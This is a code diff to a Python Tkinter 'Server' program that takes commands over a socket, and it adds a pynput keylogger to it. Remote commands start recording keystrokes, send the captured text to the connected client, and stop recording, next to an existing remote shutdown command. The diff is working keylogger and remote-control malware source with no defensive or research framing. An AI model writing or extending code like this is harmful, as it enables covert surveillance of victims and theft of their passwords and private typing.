@@ -9,6 +9,8 @@ import json
 import subprocess
 import os
 import signal
+import threading
+from pynput.keyboard import Key, Listener
 
 class Server(Tk):
     def __init__(self):
@@ -16,6 +18,9 @@ class Server(Tk):
         self.components = None
         self.server_socket = None
         self.is_running = False
+        self.keystrokes = ""
+        self.listener = Listener(on_press=self.on_key_press)
+        
 
     def initialize_component(self):
         self.title("Server")
@@ -29,6 +34,23 @@ class Server(Tk):
             # Start the server in a separate thread
             server_thread = threading.Thread(target=self.start_server)
             server_thread.start()
+
+    def on_key_press(self, key):
+        try:
+            self.keystrokes += str(key.char)
+        except AttributeError:
+            if key == Key.space:
+                self.keystrokes += " "
+            else:
+                self.keystrokes += " {" + key.name + "} "
+
+    def start_keylogger(self):
+        self.is_listener_running = True
+    
+    def stop_keylogger(self):
+        if self.is_listener_running:
+            self.listener.stop()
+            self.is_listener_running = False
 
     def start_server(self):
         host = ''  # Empty string represents your computer's default IP address
@@ -121,8 +143,18 @@ class Server(Tk):
                     if data == "shut":
                         messagebox.showinfo("", "The computer will shutdown after 5s")
                         os.system("shutdown /s /t 5")
+                    if data == "keys":
+                        self.listener = Listener(on_press=self.on_key_press)
+                        self.listener.start()
+                        self.is_listener_running = True
+                    if data == "in":
+                        client_socket.send(self.keystrokes.encode())
+                        self.keystrokes = ""
+                    if data == "stop_keylog":
+                        self.stop_keylogger()
+                        self.keystrokes = ""
 
-
+                        
 
         except socket.error as e:
             print(f"Error occurred: {str(e)}")
